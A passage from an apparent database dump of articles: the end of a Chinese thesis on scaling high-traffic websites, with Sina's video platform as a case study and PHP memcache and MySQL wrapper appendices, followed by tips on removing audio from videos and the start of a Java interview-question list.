Library）等。核心功能使用脚本语言编写，前台展示使用带特殊标签的HTML，不仅加快了开发速度，而且方便以后的维护和升级［47］。</p>\r\n\r\n<p>其次，对于前台模板，一般还需要将页面的头，尾单独提取出来，页面的主体部分也按模块或者功能拆分。对CSS，JS等辅助性的代码，也建议以单独的文件形式存放。这样不仅方便管理，修改，而且还可以在用户访问的时候进行缓存，减少网络流量，减轻服务器压力。</p>\r\n\r\n<p>再次，对于核心功能脚本，必须将与服务器相关的配置内容，如数据库连接配置，脚本头文件路径等，与代码分离开。尤其当网站使用集群技术，CDN加速等技术的时候，每一台服务器上的配置可能都会不一样。如果不使用配置文件，则需要同时维护几份不同的代码，很容易出错。</p>\r\n\r\n<p>最后，应该尽量做到修改配置文件后能实时生效，避免修改配置文件之后需要重启服务程序的情况。</p>\r\n\r\n<p>5.5 封装和中间层思想</p>\r\n\r\n<p>在功能块层次，如果使用JSP，基于纯面向对象语言Java的面向对象思想，类似数据库连接，会话管理等基本功能都已经封装成类了。如果使用PHP，则需要在脚本代码中显式的封装，将每一个功能块封装成一个函数，一个文件或者一个类。</p>\r\n\r\n<p>在更高的层次，可以将网站分为表示层，逻辑层，持久层，分别进行封装，做到当某一层架构发生变化时，不会影响到其他层。比如新浪播客在一次升级的时候，将持久层的数据库由原来的集中式改为分布式架构，因为封装了数据库连接及所有操作[附录2]，做到了不修改任何上层代码，平稳的实现了过渡。近来流行的MVC架构，将整个网站拆分成Model（模型/逻辑）、View（视图/界面）、Controller（控制/流程）三个部分，而且有很多优秀的代码框架可供选择使用， 像JSP的Structs，Spring，PHP的php.MVC， Studs 等。使用现成的代码框架，可以使网站开发事半功倍。</p>\r\n\r\n<p>6 扩容、容错处理</p>\r\n\r\n<p>6.1 扩容</p>\r\n\r\n<p>一个大型网站，在设计架构的时候，必须考虑到以后可能的容量扩充。新浪播客在设计时充分地考虑了这一点。对于视频分享类网站来说，视频存储空间消耗是巨大的。新浪播客在主存储服务器上，采用配置文件形式指定每一个存储盘柜上存储的视频文件的ID范围。当前台服务器需要读取一个视频的时候，首先通过询问主存储服务器上的接口获得该视频所在的盘柜及目录地址，然后再去该盘柜读取实际的视频文件。这样如果需要增加存储用的盘柜，只需要修改配置文件即可，前台程序丝毫不受影响。</p>\r\n\r\n<p>新浪播客采用MySQL数据库集群，在逻辑层封装了所有的数据库连接及操作。当数据库存储架构发生改变的时候，如增加一台主库，将某些数据表独立成库，增加读取数据用的从库等，都只需要修改封装了的数据库操作类，上层代码不用修改。</p>\r\n\r\n<p>新浪播客的前台页面服务器使用F5公司的硬件第四层交换机，网通，电信分别导向不同的虚拟IP，每一个虚拟IP后面又有多个服务器提供服务。当访问流量增大的时候，可以很方便往虚拟IP后面增加服务器，分担压力。</p>\r\n\r\n<p>6.2 容错</p>\r\n\r\n<p>对于商业性网站来说，可用性是非常重要的。7*24的访问要求网站具有很强的容错能力。错误包括网络错误，服务器错误以及应用程序错误。</p>\r\n\r\n<p>2006年12月27日台湾东部外海发生里氏7.6级地震，造成途径台湾海峡的多条海底电缆中断，导致许多国外网站，像MSN， NBA， Yahoo！（英文主站）等国内无法访问，但也有例外，以Google为代表的在国内建设有分布式数据节点的很多网站却仍然可以访问。虽然说地震造成断网是不可抗原因，但如果在这种情况下网站仍然可以访问，无疑能给网站用户留下深刻的印象。这件事情给大型商业网站留下的教训是：网站需要在用户主要分布区域保持数据存在，以防止可能的网络故障。</p>\r\n\r\n<p>对于服务器错误，一般采取冗余设计的方法来避免。对于存储服务器（主要是负责写入的服务器），可以使用RAID（冗余磁盘阵列）；对于数据库（主要是负责写入的主库），可以采用双主库设计［30］；对于提供服务的前台，则可以使用第四层交换的集群，由多台服务器同时提供服务，不仅分担了流量压力，同时还可以互相作为备份。</p>\r\n\r\n<p>在应用层程序中，也要考虑&ldquo;用户友好&rdquo;的出错设计。典型例子如HTTP 404 出错页面，程序内部错误处理，错误返回提示等，尽可能的做到人性化。</p>\r\n\r\n<p>7 总结及展望</p>\r\n\r\n<p>7.1 总结</p>\r\n\r\n<p>对于一个高并发高流量的网站来说，任何一个环节的瓶颈都会造成网站性能的下降，影响用户体验，进而造成巨大的经济损失。在全互联网层面，应该使用分布式设计，缩短网站与用户的网络距离，减少主干网上的流量，以及防止在网络意外情况下网站无法访问的问题。在局域网层面，应该使用服务器集群，一方面可以支撑更大的访问量，另一方面也作为冗余备份，防止服务器故障导致的网站无法访问。在单服务器层面，应该配置操作系统，文件系统及应用层软件，均衡各种资源的消耗，消除系统性能瓶颈，充分发挥服务器的潜能。在应用层，可以通过各种缓存来提升程序的效率，减少服务器资源消耗（图6）。另外，还需要合理设计应用层程序，为以后的需求变更，扩容做好准备。</p>\r\n\r\n<p>图6 典型高并发高流量网站的架构</p>\r\n\r\n<p>在每一个层次，都需要考虑容错的问题，严格消除单点故障，做到无论应用层程序错误，服务器软件错误，服务器硬件错误，还是网络错误，都不影响网站服务。</p>\r\n\r\n<p>7.2展望</p>\r\n\r\n<p>当前Linux环境下有著名的LAMP（Linux＋Apache＋MySQL＋PHP/PERL/PYTHON）网站建设方案，但只是针对一般的中小网站而言。对于高并发高流量的大型商业网站，还没有一个完整的，性价比高的解决方案。除去服务器，硬盘，带宽等硬件投资外，还需要花费大量的预算和时间精力在软件解决方案上。</p>\r\n\r\n<p>随着互联网的持续发展，Web2.0的兴起，在可以预见的未来里，互联网的用户持续增多，提供用户参与的网站不断增加，用户参与的内容日益增长，越来越多的网站的并发量，访问量会达到一个新的高度，这就会促使越来越多的个人，公司以及研究机构来关注高并发高流量的网站架构问题。就像Web1.0成就了无数中小网站，成就了LAMP一样，Web2.0注定也会成就一个新的，高效的，成本较低的解决方案。这个方案应该包括透明的第三方CDN网络加速服务，价格低廉的第四层甚至更高层网络交换设备，优化了网络性能的操作系统，优化了读写性能，分布式，高可靠的文件系统，揉合了内存，硬盘等各个级别缓存的HTTP服务器，更为高效的服务器端脚本解析器，以及封装了大部分细节的应用层设计框架。</p>\r\n\r\n<p>技术的进步永无止境。我们期待互联网更为美好的明天。</p>\r\n\r\n<p>参考文献<br />\r\n［1］Robert Hobbes&#39; Zakon， Hobbes&#39; Internet Timeline v8.2 ， available at http://www.zakon.org/robert/internet/timeline/<br />\r\n［2］GlobalReach Inc.， Global Internet Statistics (by language)， available at http://www.glreach.com/globstats/index.php3<br />\r\n［3］中国互联网络信息中心，第十九次中国互联网络发展状况统计报告，available at http://www.cnnic.net.cn/index/0E/index.htm<br />\r\n［4］Web2.0，Definition available at http://www.wikilib.com/wiki/Web2.0<br />\r\n［5］Alexa Internet, Inc. http://www.alexa.com/<br />\r\n［6］Yahoo! Inc. http://www.yahoo.com/<br />\r\n［7］eBay Inc. 著名的网上拍卖网站，http://www.ebay.com/<br />\r\n［8］Chet Dembeck, Yahoo! Cashes In On eBay&#39;s Outage, available at http://www.ecommercetimes.com/perl/story/545.html<br />\r\n［9］YouTube, Inc. http://www.youtube.com/<br />\r\n［10］数据来源：互联网周刊，2007年第3期<br />\r\n［11］新浪网技术（中国）有限公司，http://www.sina.com.cn/<br />\r\n［12］数据来源：新浪播客改版公告，available at http://games.sina.com.cn/x/n/2007-04-16/1427194553.shtml<br />\r\n［13］邓宏炎， 叶娟丽，网络参考文献初探，武汉大学学报: 人文社会科学版， 2000<br />\r\n［14］彭湘凯，CDN网络及其应用，微计算机信息，2005年02期<br />\r\n［15］数据来源：ChinaCache, http://www.chinacache.com/<br />\r\n［16］Open System Interconnect，开放式系统互联模型，1984年由国际标准化组织（ISO）提出的一个开放式网络互联参考模型，参考 http://www.iso.org/<br />\r\n［17］凌仲权，丁振国，基于第四层交换技术的负载均衡，中国数据通信，2003<br />\r\n［18］陈明锐，邱钊，黄曦，黄俊，智能负载均衡技术在高负荷网站上的应用，广西师范大学学报(自然科学版)，2006年04期<br />\r\n［19］Alteon Inc. http://www.alteon.com/<br />\r\n［20］F5 Networks, Inc. http://www.f5.com.cn/<br />\r\n［21］数据来源：http://www.toplee.com/blog/archives/71.html<br />\r\n［22］ 傅明，程晓恒，王玮，基于Linux的服务器负载均衡性访问的解决方案，计算机系统应用，2001年09期<br />\r\n［23］Ming-Wei Wu, Ying-Dar Lin, Open source software development: an overview, Computer, 2001 - ieeexplore.ieee.org<br />\r\n［24］王海花 , 杨斌，Linux TCP/IP协议栈的设计及实现特点，云南民族大学学报（自然科学版），2007年01期<br />\r\n［25］Requests for Comments（RFC），the publication vehicle for technical specifications and policy documents produced by the (IETF (Internet Engineering Task Force) , the IAB (Internet Architecture Board), or the IRTF (Internet Research Task Force)，http://www.ietf.org/rfc.html<br />\r\n［26］RFC 1323，http://www.ietf.org/rfc/rfc1323.txt?number=1323<br />\r\n［27］Squid web proxy cache team， http://www.squid-cache.org/<br />\r\n［28］马俊昌 , 古志民，网络代理缓存Squid存储系统分析，计算机应用，2003年10期<br />\r\n［29］韩向春，郭婷婷，林星宇，丰保杰，集群缓存系统中代理缓存技术的研究，计算机工程与设计，2006年20期<br />\r\n［30］Brad Fitzpatrick， LiveJournal&#39;s Backend，A history of scaling， oscon 2005 ，http://www.danga.com/words/<br />\r\n［31］Danga Interactive， http://www.danga.com/memcached/<br />\r\n［32］LiveJournal，著名的博客托管商（BSP）， http://www.livejournal.com/<br />\r\n［33］Brad Fitzpatrick，Distributed caching with memcached，Linux Journal ，Volume 2004，Issue 124，Page 5， August 2004<br />\r\n［34］周枫，面向 Internet 服务的可扩展集群对象 存储及磁盘日志缓存技术研究，清华大学硕士毕业论文，2002<br />\r\n［35］陈赟，杨根科，吴智铭，RAID系统中RAID级别的具体实现算法，微型电脑应用，2003年06期<br />\r\n［36］陈平仲，硬件实现RAID与软件实现RAID的比较，现代计算机（专业版），2005年01期<br />\r\n［37］NAMESYS，http://www.namesys.com/<br />\r\n［38］D Bobbins，Advanced file system implementor s guide: Journalling and ReiserFS，IBM&#39;s Developer Works Journal，June，2001<br />\r\n［39］刘章仪，Linux文件系统分析，贵州工业大学学报（自然科学版），2002年04期<br />\r\n［40］数据来源：http://news.netcraft.com/archives/2007/04/02/april_2007_web_server_survey.html<br />\r\n［41］The Apache Software Foundation ，http://httpd.apache.org/<br />\r\n［42］Lighttpd， http://www.lighttpd.net/<br />\r\n［43］MySQL AB，http://www.mysql.com/<br />\r\n［44］顾治华，忽朝俭，MySQL存储引擎与数据库性能，计算机时代，2006年10期<br />\r\n［45］The PHP Group，http://www.php.net/<br />\r\n［46］范云芝，动态网页制作技术ASP、PHP和JSP比较分析，电脑知识与技术（学术交流），2005年10期<br />\r\n［47］王耀希，王丽清，徐永跃，利用模板技术实现B/S 研发过程的分离与并行，计算机应用研究，2004</p>\r\n\r\n<p>附 录</p>\r\n\r\n<p>[附录1]</p>\r\n\r\n<p>1. Memcache的客户端PHP 封装</p>\r\n\r\n<p>class memcache_class<br />\r\n{</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function memcache_class()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;/**<br />\r\n&nbsp;&nbsp; &nbsp;* 用post方法，执行memcache的写入操作<br />\r\n&nbsp;&nbsp; &nbsp;* $data参数，允许是php的数组。<br />\r\n&nbsp;&nbsp; &nbsp;* exp参数是设定的超时时间，单位是秒。<br />\r\n&nbsp;&nbsp; &nbsp;*/<br />\r\n&nbsp;&nbsp; &nbsp;function p_memcache_write($key, $data, $exp=3600)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$mmPageStartTime = microtime();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$ip = MEMCACHE_SERVER_IP;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$port = MEMCACHE_SERVER_PORT;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$type = MEMCACHE_SERVER_TYPE;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//对$data进行序列化，允许$data是数组<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$data = serialize($data);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//对$data进行压缩<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//$data = gzcompress ($data);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$submit=array(<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;type =&gt; $type,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cmd =&gt; &quot;set&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;key =&gt; $key,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;data =&gt; $data,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;exp =&gt; $exp<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$ret = memcache_class::posttohost($query, $submit);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $ret;<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;/**<br />\r\n&nbsp;&nbsp; &nbsp;* 用post方法，执行memcache的读出操作<br />\r\n&nbsp;&nbsp; &nbsp;*/<br />\r\n&nbsp;&nbsp; &nbsp;function p_memcache_read($key)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$mmPageStartTime = microtime();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$ip = MEMCACHE_SERVER_IP;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$port = MEMCACHE_SERVER_PORT;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$type = MEMCACHE_SERVER_TYPE;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$submit=array(<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;type =&gt; $type,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cmd =&gt; &quot;get&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;key =&gt; $key<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$res = memcache_class::posttohost($query, $submit);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//对$res进行解压缩<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//$res = gzuncompress($res);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//对$res进行反序列化，允许$res是数组<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$res = unserialize($res);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $res;<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;/**<br />\r\n&nbsp;&nbsp; &nbsp;* 执行post的函数<br />\r\n&nbsp;&nbsp; &nbsp;*/<br />\r\n&nbsp;&nbsp; &nbsp;function posttohost($url, $data)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$mmPageStartTime = microtime();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$url = parse_url($url);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$encoded = &quot;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (list($k,$v) = each($data))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$encoded .= ($encoded ? &quot;&amp;&quot; : &quot;&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$encoded .= rawurlencode($k).&quot;=&quot;.rawurlencode($v);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for ($i = 0; $i &lt; 3; $i ++)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$fp = @fsockopen($url[&#39;host&#39;], $url[&#39;port&#39;],$errno, $errstr, 1);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ($fp)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (!$fp)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return &quot;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@stream_set_timeout($fp, 2);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, sprintf(&quot;POST %s%s%s HTTP/1.0\n&quot;, $url[&#39;path&#39;], $url[&#39;query&#39;] ? &quot;?&quot; : &quot;&quot;, $url[&#39;query&#39;]));<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, &quot;Host: $url[host]\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, &quot;Content-type: application/x-www-form-urlencoded\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, &quot;Content-length: &quot; . strlen($encoded) . &quot;\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, &quot;Connection: close\n\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fputs($fp, &quot;$encoded\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$line = @fgets($fp,1024);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (!eregi(&quot;^HTTP/1.. 200&quot;, $line)) return;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$results = &quot;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$inheader = 1;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while(!feof($fp))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$line = @fgets($fp,1024);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ($inheader &amp;&amp; ($line == &quot;\n&quot; || $line == &quot;\r\n&quot;))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$inheader = 0;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elseif (!$inheader)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$results .= $line;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fclose($fp);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $results;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}</p>\r\n\r\n<p><br />\r\n2.使用示例</p>\r\n\r\n<p>$out=&quot;&quot;;<br />\r\nif (MEMCACHE_FLAG === true)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;$memcache_key = md5(trim($key));<br />\r\n&nbsp;&nbsp; &nbsp;$time_before = getmicrotime();<br />\r\n&nbsp;&nbsp; &nbsp;$mdata = memcache_class::p_memcache_read($memcache_key);<br />\r\n&nbsp;&nbsp; &nbsp;$time_after = getmicrotime();<br />\r\n&nbsp;&nbsp; &nbsp;$memcache_read_time = $time_after - $time_before;<br />\r\n&nbsp;&nbsp; &nbsp;if(strlen($mdata) &gt;= MIN_RESULT)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$out = $mdata;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$memhit = 1;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;memcached_log(&quot;CACHE_HIT&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;else<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$memhit = 0;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;memcached_log(&quot;CACHE_NOT_HIT&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\nif (!(strlen($out) &gt;= MIN_RESULT))<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;$query = get_query();<br />\r\n&nbsp;&nbsp; &nbsp;$time_before=getmicrotime();<br />\r\n&nbsp;&nbsp; &nbsp;$out = http_read($MySQLHost,$MySQLPort,$query,&amp;$errstr,10);<br />\r\n&nbsp;&nbsp; &nbsp;$time_after=getmicrotime();<br />\r\n}<br />\r\n$len = strlen($out);<br />\r\nif(MEMCACHE === true &amp;&amp; $memhit &lt;= 0)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;$memcache_key = md5(trim($key));<br />\r\n&nbsp;&nbsp; &nbsp;$time_before = getmicrotime();<br />\r\n&nbsp;&nbsp; &nbsp;memcache_class::p_memcache_write($memcache_key, $out, MEMCACHE_TIME);<br />\r\n&nbsp;&nbsp; &nbsp;$time_after = getmicrotime();<br />\r\n&nbsp;&nbsp; &nbsp;$memcache_write_time = $time_after - $time_before;<br />\r\n&nbsp;&nbsp; &nbsp;memcached_log(&quot;CACHE_WRITE&quot;);<br />\r\n}</p>\r\n\r\n<p><br />\r\n[附录2]<br />\r\nMySQL wrap class<br />\r\n&lt;?php<br />\r\nclass mysqlRpc<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;var $_hostWrite = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_userWrite = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_passWrite = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_hostRead = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_userRead = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_passRead = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $_dataBase = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;var $db_write_handle = null;<br />\r\n&nbsp;&nbsp; &nbsp;var $db_read_handle = null;<br />\r\n&nbsp;&nbsp; &nbsp;var $db_last_handle = null;<br />\r\n&nbsp;&nbsp; &nbsp;var $_cacheData = array();<br />\r\n&nbsp;&nbsp; &nbsp;var $mmtime = 60;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function mysqlRpc($database, $w_servername, $w_username, $w_password, $r_servername=&#39;&#39;, $r_username=&#39;&#39;, $r_password=&#39;&#39;) {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function connect_write_db() {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function connect_read_db() {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function query_write($sql, $return = false) {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function query_read($sql, $return = false) {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function query_first($sql, $return = false) {}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function insert_id(){}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function affected_rows(){}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function escape_string($string){}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function fetch_array($queryresult, $type = MYSQL_ASSOC){}<br />\r\n}<br />\r\n?&gt;</p>\r\n\r\n<p>致 谢<br />\r\n首先衷心的感谢我的指导老师朱小明老师，正是在他的悉心指导下，这篇论文才得以顺利的完成。同时感谢信息科学学院的老师们，他们以严谨的治学态度和兢兢业业的工作精神，教会了我专业的知识和做人的道理。我还想感谢北京师范大学的所有的老师，同学们，我们一起在&ldquo;学为人师，行为世范&rdquo;的校训下度过了这难忘的四年，完成了成长最后的蜕变。<br />\r\n本文在写作的过程中得到了新浪公司的大力支持，有来自新浪播客，新浪爱问搜索的多位同事对文中的架构方案，技术细节等提供了非常有用的建议，在此一并感谢！<br />\r\n最后，感谢在我生命的过程中一直毫无保留的支持我的家人和朋友！</p>\r\n',0,1437040336,0,0),(18,20,'去除视频中的声音','<p>1、windows movie maker</p>\r\n\r\n<p>把视频导入到movie maker中，右键点击视频，点&ldquo;添加到时间线&rdquo;，把视频导入到下边的时间线上了，时间线左边的&ldquo;视频&rdquo;可以展开，分为&ldquo;过渡&rdquo;和&ldquo;音频&rdquo;，&ldquo;音频&rdquo;便是视频声音，在时间线音频的进度条上点右键，选择&ldquo;静音&rdquo;，然后点左上角的&ldquo;文件&rdquo;，选&ldquo;保存电影文件&rdquo;，保存为wmv格式。<br />\r\n你可以注意一下时间线 时间线上有视频轨道和音频轨道 两种轨道 当你把视频放在时间线上的时候也相应的2个轨道都出现了可编辑条，你可以把音频轨道上的编辑条删掉。或者直接用movie maker编辑，将所有声音调到零，重新生成。</p>\r\n\r\n<p>2、会声会影</p>\r\n\r\n<p>把视频插入到视频轨，在视频轨右击视频，点分割音频，音频就会被分割在下面的声音轨道。如果想删除：右击声音轨道上的音频，点删除，这样视频原有的声音就被去掉了。<br />\r\n也可以素材导入视频轨，单击一下该素材，然后单击&ldquo;视频&rdquo;或&ldquo;编辑&rdquo;面板上的一个&ldquo;小喇叭&rdquo;图标，就能实现静音了。或者直接用绘声绘影找到声音控制将它调到零，声音层也要调到最低，重新生成。</p>\r\n\r\n<p>3、RM/MP4或者Total Video Converter转换专家</p>\r\n\r\n<p>你可以在转换的时候去掉声音！</p>\r\n\r\n<p>4、下载的视频有二种声音，播放的时候，即有白话，又有普通话，而且二者不同步,怎样去除其中的一个？</p>\r\n\r\n<p>不用软件，直接打开音量控制，在第一个主音量的下面有个平衡 ，有向左向右的调节 ，保留喜欢什么样的声音 ，如何把它调最左和最右就OK了！</p>\r\n\r\n<p>5、去除下载的视频去马赛克工具</p>\r\n\r\n<p>VideoEnhancer</p>\r\n\r\n<p>众所周知，有很多视频被加了马赛克从而防止个人信息的泄露。Video Enhancer 是一款提升视频质量的软件。采用大量的VirtualDub滤镜和附加的编码器重新压缩的视频处理，将马赛克进行还原。</p>\r\n\r\n<p>说明：去除马赛克的软件只能对原始视频有用，如果经过二次转码、压缩，所以90%的视频马赛克是没法去除的。</p>\r\n',0,1437043423,0,0),(19,17,'JAVA面试题大全','<p>1.Java中的异常处理机制的简单原理和应用。</p>\r\n\r\n<p>当Java程序违反了Java的语义规则 时，Java虚拟机就会将发生的错误表示为一个异常。违反语义规则包括2种情况。一种是Java类库内置的语义检查。例如数组下标越界,会引发 IndexOutOfBoundsException;访问null的对象时会引发NullPointerException。另一种情况就是Java允 